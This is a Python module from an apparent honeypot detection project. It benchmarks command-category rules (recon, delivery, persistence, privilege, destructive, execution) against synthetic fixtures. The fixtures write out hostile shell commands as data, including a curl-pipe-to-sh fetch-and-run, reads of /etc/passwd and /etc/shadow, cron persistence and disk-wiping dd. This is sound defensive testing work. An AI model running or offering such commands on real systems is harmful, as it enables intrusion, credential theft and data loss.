"""Deterministic fixture checks of command categories; not an attack benchmark.

Does not execute fixture commands or echo their raw text to reports.
"""
from __future__ import annotations

from collections import Counter
import json
from pathlib import Path
from typing import Iterable

from honeytrace.detection import RULE_IDS, RULE_VERSION, command_indicators

MAX_CASE_BYTES = 2 * 1024 * 1024
MAX_CASES = 2000

# Public, intentionally synthetic expectations about *command syntax* only.
# These are not human-labeled real attacks and have no claim of representativeness.
SAMPLE_CASES: tuple[tuple[str, tuple[str, ...]], ...] = (
    ("whoami", ("recon",)),
    ("uname -a", ("recon",)),
    ("cat /etc/passwd", ("recon",)),
    ("crontab -l", ("recon",)),
    ("echo 'wget https://example.invalid/a'", ()),
    ("grep -n 'rm -rf' a.txt", ()),
    ("echo 'cat /etc/shadow'", ()),
    ("logger 'curl https://example.invalid'", ()),
    ("echo 'authorized_keys' > /tmp/note", ()),
    ("cat /etc/os-release", ("recon",)),
    ("wget https://example.invalid/drop", ("delivery",)),
    ("busybox wget https://example.invalid/a", ("delivery",)),
    ("env X=1 curl https://example.invalid", ("delivery",)),
    ("curl -I https://example.invalid", ("delivery",)),
    ("crontab -e", ("persistence",)),
    ("echo harmless >> /etc/cron.d/test", ("persistence",)),
    ("sudo -l", ("privilege",)),
    ("sudo cat /etc/shadow", ("privilege",)),
    ("find / -perm -4000", ("privilege",)),
    ("rm -rf /tmp/test-directory", ("destructive",)),
    ("dd if=/dev/zero of=/dev/loop0", ("destructive",)),
    ("base64 --decode sample.txt", ("obfuscated",)),
    ("python3 -c 'print(1)'", ("obfuscated",)),
    ("bash -c 'wget https://example.invalid/drop'", ("delivery", "obfuscated")),
    ("./run-local-script", ("execution",)),
    ("sh /tmp/script.sh", ("execution",)),
    ("wget https://example.invalid/a; chmod +x /tmp/a; ./a", ("delivery", "execution")),
    ("curl -fsSL https://example.invalid/a | sh", ("delivery", "execution")),
    ("echo 'rm -rf /'", ()),
    ("bash -c 'echo \"wget\"'", ("obfuscated",)),
)


def load_cases(path: str | Path) -> list[tuple[str, tuple[str, ...]]]:
    """Read analyst-provided JSONL. Expected labels denote syntax categories only."""
    source = Path(path)
    if source.stat().st_size > MAX_CASE_BYTES:
        raise ValueError("Case file exceeds 2 MB")
    result: list[tuple[str, tuple[str, ...]]] = []
    with source.open("r", encoding="utf-8-sig") as stream:
        for lineno, line in enumerate(stream, 1):
            if not line.strip():
                continue
            if len(result) >= MAX_CASES:
                raise ValueError("More than 2000 cases")
            try:
                case = json.loads(line)
            except json.JSONDecodeError as error:
                raise ValueError(f"Case line {lineno}: invalid JSON") from error
            if not isinstance(case, dict) or not isinstance(case.get("command"), str) or not isinstance(case.get("expected"), list):
                raise ValueError(f"Case line {lineno}: expected object with command string and expected array")
            expected = case["expected"]
            if len(case["command"]) > 4096 or not case["command"].strip():
                raise ValueError(f"Case line {lineno}: command missing or too long")
            if any(not isinstance(label, str) or label not in RULE_IDS for label in expected) or len(set(expected)) != len(expected):
                raise ValueError(f"Case line {lineno}: invalid or duplicate category")
            result.append((case["command"], tuple(expected)))
    if not result:
        raise ValueError("No labeled command cases")
    return result


def benchmark_rules(cases: Iterable[tuple[str, tuple[str, ...]]], *, origin: str = "synthetic-fixtures") -> dict:
    """Multilabel command-category agreement. Metrics are not attack detection accuracy."""
    tallies: dict[str, Counter[str]] = {label: Counter() for label in RULE_IDS}
    count = 0
    exact = 0
    for command, expected in cases:
        count += 1
        actual = command_indicators(command)
        anticipated = set(expected)
        exact += actual == anticipated
        for label in RULE_IDS:
            if label in actual and label in anticipated:
                tallies[label]["tp"] += 1
            elif label in actual:
                tallies[label]["fp"] += 1
            elif label in anticipated:
                tallies[label]["fn"] += 1
            else:
                tallies[label]["tn"] += 1
    if not count:
        raise ValueError("No cases to benchmark")
    def ratio(top: int, bottom: int):
        return round(top / bottom, 4) if bottom else None
    def summary(counts: Counter[str]):
        tp, fp, fn, tn = (counts[name] for name in ("tp", "fp", "fn", "tn"))
        return {"tp": tp, "fp": fp, "fn": fn, "tn": tn,
                "precision": ratio(tp, tp + fp), "recall": ratio(tp, tp + fn),
                "f1": ratio(2 * tp, 2 * tp + fp + fn)}
    total = Counter()
    for counts in tallies.values():
        total.update(counts)
    return {"kind": "command-rule-category-agreement", "version": RULE_VERSION,
            "case_origin": origin, "cases": count, "categories": len(RULE_IDS),
            "exact_match_rate": ratio(exact, count), "micro": summary(total),
            "by_category": {label: {"rule_id": RULE_IDS[label], **summary(counts)} for label, counts in sorted(tallies.items())},
            "limitations": "Manually supplied or synthetic syntax expectations, not verified attack intent or real-world ML accuracy. Command parsing is shallow and can miss shell constructs. No commands or secrets are included in this report."}
